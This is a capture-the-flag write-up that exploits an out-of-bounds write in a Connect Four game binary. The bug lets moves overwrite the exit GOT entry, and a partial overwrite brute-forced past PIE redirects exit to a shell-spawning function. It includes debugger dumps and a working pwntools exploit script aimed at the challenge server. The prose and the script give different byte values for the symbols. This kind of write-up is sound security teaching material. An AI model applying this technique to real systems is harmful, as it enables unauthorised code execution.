# Infinite Connect Four
## Finding the bug
In the source code there is a main function that operates the game and also an uncalled `win` function that will open us a shell. We also find that the `game` function that is called in main within which we find the bug: 
```c
int colint = col - '0';
if (board[7][colint] == player1symbol || board[7][colint] == player2symbol) {
	// we have to shift the entire column down
	int lastfree = 0;
	while (board[lastfree][colint] == player1symbol || board[lastfree][colint] == player2symbol) {
		lastfree--;
}
```
Here we see that there is no check to see whether `lastfree` is negative and everytime the highest position on the board is full it will "shift the entire column down"
Hence it is possible for us to make the `lastfree` negative and then overwrite the data before the `board` whenever it shifts it down

In Binary Ninja, we dump the elf file in and see what data is stored before the `board`: 
![](../Assets/Screenshot%202025-06-02%20at%201.26.42%20PM.png)

We can see that the Global Offset Table is right above the board. Overwriting a GOT entry will allow us to redirect the program to the `win` function. Here in this case, exit is the last function and the nearest function to the board so that is what we will overwrite. So whenever `exit` is called, it will actually run `win` instead. 

So the board is at offset 0x60a0 and the GOT is at 0x6060 so there is a difference in 0x40 bytes

## Checking for file protections
```
hnin@ubuntu:~$ checksec infinite_connect_four
[*] '/home/hnin/infinite_connect_four'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Notice here there is PIE enabled (so the runtime addresses are all randomised) but RELRO is only partial relro so GOT can still be overwritten. 

## Finding the offsets 
Lets verify this in runtime in gdb-pwndbg. 
Run the program, set the breakpoint at main:
```
pwndbg> got
State of the GOT of /home/hnin/infinite_connect_four:
GOT protection: Partial RELRO | Found 10 GOT entries passing the filter
[0x55555555a018] putchar@GLIBC_2.2.5 -> 0x555555555030 ◂— endbr64 
[0x55555555a020] puts@GLIBC_2.2.5 -> 0x555555555040 ◂— endbr64 
[0x55555555a028] __stack_chk_fail@GLIBC_2.4 -> 0x555555555050 ◂— endbr64 
[0x55555555a030] setbuf@GLIBC_2.2.5 -> 0x555555555060 ◂— endbr64 
[0x55555555a038] system@GLIBC_2.2.5 -> 0x555555555070 ◂— endbr64 
[0x55555555a040] printf@GLIBC_2.2.5 -> 0x555555555080 ◂— endbr64 
[0x55555555a048] fgets@GLIBC_2.2.5 -> 0x555555555090 ◂— endbr64 
[0x55555555a050] getchar@GLIBC_2.2.5 -> 0x5555555550a0 ◂— endbr64 
[0x55555555a058] setvbuf@GLIBC_2.2.5 -> 0x5555555550b0 ◂— endbr64 
[0x55555555a060] exit@GLIBC_2.2.5 -> 0x5555555550c0 ◂— endbr64 


pwndbg> x/32x 0x55555555a060
0x55555555a060 <exit@got.plt>:	0x555550c0	0x00005555	0x00000000	0x00000000
0x55555555a070:	0x00000000	0x00000000	0x00000000	0x00000000
0x55555555a080:	0x00000000	0x00000000	0x5555a088	0x00005555
0x55555555a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x55555555a0a0 <board>:	0x20202020	0x20202020	0x20202020	0x20202020
0x55555555a0b0 <board+16>:	0x20202020	0x20202020	0x20202020	0x20202020
0x55555555a0c0 <board+32>:	0x20202020	0x20202020	0x20202020	0x20202020
0x55555555a0d0 <board+48>:	0x20202020	0x20202020	0x20202020	0x20202020
```

We know that the board is `8*8` given the source code 
```c
char board[8][8] = {
'\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20',
'\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20',
'\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20',
'\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20',
'\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20',
'\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20',
'\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20',
'\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20', '\x20'
};
```
But in each row of memory address here is it 16 bytes so each row in the memory here contains 2 rows of the game board. 
```
0x55555555a0a0 <board>:	0x20202020	0x20202020	0x20202020	0x20202020
0x55555555a0b0 <board+16>:	0x20202020	0x20202020	0x20202020	0x20202020
0x55555555a0c0 <board+32>:	0x20202020	0x20202020	0x20202020	0x20202020
0x55555555a0d0 <board+48>:	0x20202020	0x20202020	0x20202020	0x20202020
```
So from above, we prob need to overwrite 7 rows until we reach the entry for the exit

## Testing the hypothesis
Run the program again in pwndbg. 
Setting player 1 symbol as `A` and player 2 as `B` for simple identification. Keep pressing `0` for the column for both Player 1 and 2 for a total of 16 times (8 times for each player)

Now if we observe the memory region again
```
pwndbg> x/32x 0x55555555a060
0x55555555a060 <exit@got.plt>:	0x55555041	0x00005555	0x00000042	0x00000000
0x55555555a070:	0x00000041	0x00000000	0x00000042	0x00000000
0x55555555a080:	0x00000041	0x00000000	0x5555a042	0x00005555
0x55555555a090:	0x00000041	0x00000000	0x00000042	0x00000000
0x55555555a0a0 <board>:	0x20202041	0x20202020	0x20202042	0x20202020
0x55555555a0b0 <board+16>:	0x20202041	0x20202020	0x20202042	0x20202020
0x55555555a0c0 <board+32>:	0x20202041	0x20202020	0x20202042	0x20202020
0x55555555a0d0 <board+48>:	0x20202041	0x20202020	0x20202042	0x20202020
```
We know that the last byte of the GOT entry for exit is overwritten by 0x41 which is `A`

So how do we overwrite it properly for the program to redirect to win. Overwrite the first column results in overwriting the last 2 hex digit in the GOT entry. So we need to overwrite both the first and second column to overwrite the last 4 hex digit in the GOT entry. There is a 1/16 chance that this will happen.

Then by instead of `A` and `B` for the player symbol we set them as `\x1f` and `\c9`

## Wait, what about PIE & ASLR? 
Apparently we can just bruteforce this a few times as the first few hex digits will most likely be the same so we just need to bruteforce it until the fourth last nibble matches and then we'll be able to redirect to win. 

## python pwn script
We just keep running this script until there isn't an SIGSEGV error and it spawns the shell
``` python
from pwn import * 

#p = process("./infinite_connect_four")
p = remote('challs.nusgreyhats.org', 33102) 

def send(payload):
	p.sendlineafter(b'> ', payload)
	
# first send the symbols of the players
send(b'\xc9') 
send(b'\xbf') 

#setting this will make sure the last byte is overwritten with \xc9 and the seonc last byte is overwrrite with \xbf
send(b'0') 
send(b'1') 

for i in range(15): 
	send(b'0') 
for i in range(15): 
	send(b'1') 

#this will call the exit function but then it will actually execute win
send(b'A') 
p.interactive()
```